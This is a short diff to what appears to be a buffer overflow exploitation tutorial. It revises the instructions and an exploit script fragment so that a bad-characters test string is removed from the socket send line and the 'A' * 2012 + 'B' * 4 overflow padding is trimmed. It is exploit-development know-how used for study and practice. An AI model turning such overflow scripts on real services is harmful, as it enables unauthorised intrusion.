@@ -640,6 +640,8 @@ except:
     
     - In my case I will do a new python script called: `3_fz3r0_brainstorm.py`
     
+        - **Delete "badchars" from the line `s.send(message + b'\r\n') `**
+        
         - **We will delete from `shellcode = "A" * 2012 + "B" * 4 + badchars`; the ending: `"B" * 4 + badchars`:
         
             - Result: **`shellcode = "A" * 2012 +`**
@@ -688,7 +690,7 @@ try:
         s.recv(1024)
         s.send(username + b'\r\n')
         s.recv(1024)
-        s.send(message + badchars + b'\r\n')    
+        s.send(message + b'\r\n')    
         s.recv(1024)
         s.close()
         
